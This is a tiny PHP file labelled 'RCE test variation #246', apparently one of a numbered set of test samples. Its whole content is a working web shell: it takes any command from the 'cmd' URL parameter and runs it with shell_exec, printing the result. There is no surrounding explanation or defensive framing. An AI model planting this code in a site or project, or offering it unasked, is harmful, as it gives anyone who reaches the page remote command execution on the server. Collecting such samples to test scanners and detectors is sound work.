<?php
// RCE test variation #246
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>